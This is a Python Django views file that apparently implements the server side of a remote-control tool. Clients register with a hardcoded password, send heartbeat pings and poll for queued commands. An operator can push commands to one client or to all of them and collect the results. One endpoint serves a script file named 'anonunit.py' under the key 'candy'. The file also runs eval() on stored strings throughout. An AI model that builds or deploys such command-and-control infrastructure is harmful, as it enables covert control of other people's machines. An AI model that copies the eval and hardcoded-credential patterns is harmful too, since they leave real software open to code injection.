from django.http import HttpResponse
from rest_framework import status
from django.template import loader
from rest_framework.decorators import api_view
from rest_framework.response import Response
from django.shortcuts import redirect
import random
from django.contrib.auth.models import User
from rest_framework.parsers import JSONParser
from .models import Messages, Command, Script, CommandResponse, UserData
from django.utils import timezone


@api_view(['GET', 'POST'])
def login(request):
    try:
        data = JSONParser().parse(request)
        print(data)
        uid = str(data['uid'])
        user = User.objects.filter(username=uid)
        print(user)
        print(len(user))
        print(uid)

        if len(user) == 1:
            print('user exists')
            userdata = UserData.objects.get(user=user[0])
            print(userdata)

            data = {'response': '', 'client': uid, 'time_received': str(timezone.now()),
                                   'exec_duration': 'NIL', 'directory': 'NIL'}

            user = 'helloworld'
            user = User.objects.get(username=user)
            mess = CommandResponse.objects.get(user=user)
            command = mess.command

            command = eval(command)
            command.append(data)
            command.reverse()
            mess.command = command
            mess.save()

            context = {'user': str(userdata)}
            print(context)
            return Response(context, status=status.HTTP_200_OK)
        else:
            print('registering...1')
            pwd1 = '1111'
            name = data['name']
            print(name)
            print(uid)
            info = User.objects.create_user(username=uid, password=pwd1)
            info.save()
            print('registering...2')
            x = User.objects.values()
            print(x)
            sn = len(x) + 1000
            print(sn)
            user = User.objects.get(username=uid)
            print(uid)
            ud = UserData(user=user, serial_num=f'{name}-{sn}', name=name)
            new = Messages(user=user)
            cm = Command(user=user)
            sc = Script(user=user)
            cr = CommandResponse(user=user)
            ud.save()
            new.save()
            cm.save()
            sc.save()
            cr.save()
            print('saved')

            data = {'response': '', 'client': uid, 'time_received': str(timezone.now()),
                                   'exec_duration': 'NIL', 'directory': 'NIL'}

            user = 'helloworld'
            user = User.objects.get(username=user)
            mess = CommandResponse.objects.get(user=user)
            command = mess.command

            command = eval(command)
            command.append(data)
            command.reverse()
            mess.command = command
            mess.save()

            userdata = UserData.objects.get(user=user)
            context = {'user': str(userdata)}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        print(e)
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def script(request):
    try:
        py_file = open('remote/anonunit.py', 'r')
        data = py_file.read()
        py_file.close()
        context = {'new': True, 'candy': str(data)}
        return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def get_clients(request):
    try:
        clients = UserData.objects.all()
        all_clients = []
        for i in clients:
            last = i.last_seen
            period = timezone.now() - last
            sec = period.seconds
            days = period.days
            print(sec)
            if sec > 10:
                i.active = False
                i.save()
            else:
                i.active = True
                i.save()
            client = {'uid': str(i.user), 'name': i.name, 'last_seen': i.last_seen, 'active': i.active,
                      'serial_num': i.serial_num}
            all_clients.append(client)
        print(all_clients)
        context = {'clients': all_clients}
        return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        print(e)
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def ping(request):
    try:
        data = JSONParser().parse(request)
        print(data)
        user = data['uid']
        user = User.objects.get(username=user)
        userdata = UserData.objects.get(user=user)
        userdata.last_seen = timezone.now()
        userdata.save()
        context = {}
        return Response(context, status=status.HTTP_200_OK)
    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def get_uid(request):
    try:
        data = JSONParser().parse(request)
        print(data)
        user = data['target']
        userdata = UserData.objects.filter(serial_num=user)
        if len(userdata) == 1:
            userdata = userdata[0]
            uid = userdata.user
            print(uid)
            context = {'uid': str(uid)}
            return Response(context, status=status.HTTP_200_OK)
        else:
            context = {'uid': 0}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def sender(request):
    try:
        if request.method == 'GET':

            """user = 'helloworld001'
            user = User.objects.get(username=user)
            c = CommandResponse(user=user)
            c.save()"""
            context = {'mode': 'SANDBOX'}

            return Response(context, status=status.HTTP_200_OK)

        elif request.method == 'POST':
            data = JSONParser().parse(request)
            user = data['uid']
            user = User.objects.get(username=user)
            mess = Messages.objects.get(user=user)
            message = mess.message

            message = eval(message)
            message.append(data)
            print(message)

            mess.message = message

            mess.save()
            context = {'mode': 'SANDBOX', 'message': f'message sent to {user}'}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def send_command(request):
    try:
        if request.method == 'GET':
            context = {'mode': 'SANDBOX'}
            return Response(context, status=status.HTTP_200_OK)

        elif request.method == 'POST':
            data = JSONParser().parse(request)
            print(data)
            target = data['target']
            if target == 'active':
                user = User.objects.all()
                for i in user:
                    mess = Command.objects.get(user=i)
                    command = mess.command
                    command = eval(command)
                    command.append(data)
                    command.reverse()
                    mess.command = command
                    mess.save()
                context = {'mode': 'SANDBOX', 'command': f'command sent to all clients'}
                return Response(context, status=status.HTTP_200_OK)
            else:
                user = User.objects.filter(username=target)
                print(user)
                if len(user) > 0:
                    mess = Command.objects.get(user=user[0])
                    command = mess.command
                    command = eval(command)
                    command.append(data)
                    command.reverse()
                    mess.command = command
                    mess.save()
                    context = {'mode': 'SANDBOX', 'command': f'command sent to user: {target}'}
                    return Response(context, status=status.HTTP_200_OK)
                else:
                    context = {'mode': 'SANDBOX', 'command': f'user: {target} not found'}
                    return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        print(context)
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def read_command(request):
    try:
        data = JSONParser().parse(request)
        user = data['uid']
        user = User.objects.get(username=user)
        mess = Command.objects.get(user=user)
        count = mess.command_count
        command = mess.command

        command = eval(command)
        print(len(command))
        print(int(count))

        if int(count) < int(len(command)):
            diff = int(len(command) - count)
            print(diff)
            new_commands = command[0:diff]
            mess.command_count = len(command)
            mess.save()
            context = {'new': True, 'command': new_commands, 'sender': str(user)}
            return Response(context, status=status.HTTP_200_OK)
        else:
            context = {'new': False, 'command': ''}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        print(context)
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def command_feedback(request):
    try:
        if request.method == 'GET':
            context = {'mode': 'SANDBOX'}
            return Response(context, status=status.HTTP_200_OK)

        elif request.method == 'POST':
            data = JSONParser().parse(request)

            user = 'helloworld'
            user = User.objects.get(username=user)
            mess = CommandResponse.objects.get(user=user)
            command = mess.command

            command = eval(command)
            command.append(data)
            command.reverse()
            mess.command = command
            mess.save()

            context = {'mode': 'SANDBOX', 'response': f'response sent to {user}'}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        print(context)
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def command_response(request):
    try:
        user = 'helloworld'
        user = User.objects.get(username=user)
        mess = CommandResponse.objects.get(user=user)
        count = mess.command_count
        command = mess.command

        command = eval(command)
        print(len(command))
        print(int(count))

        if int(count) < int(len(command)):
            diff = int(len(command) - count)
            print(diff)
            new_commands = command[0:diff]

            mess.command_count = len(command)
            mess.save()
            context = {'new': True, 'response': new_commands, 'sender': str(user)}
            return Response(context, status=status.HTTP_200_OK)

        else:
            context = {'new': False, 'response': ''}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def reader(request):
    try:
        user = 'helloworld002'
        user = User.objects.get(username=user)
        mess = Messages.objects.get(user=user)
        count = mess.message_count
        message = mess.message

        message = eval(message)
        print(len(message))
        print(int(count))

        if int(count) < int(len(message)):
            new_message = message[int(len(message) - 1)]
            mess.message_count = len(message)
            mess.save()
            print(message)
            context = {'new': True, 'message': new_message, 'sender': str(user)}
            return Response(context, status=status.HTTP_200_OK)
        else:
            context = {'new': False, 'message': ''}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)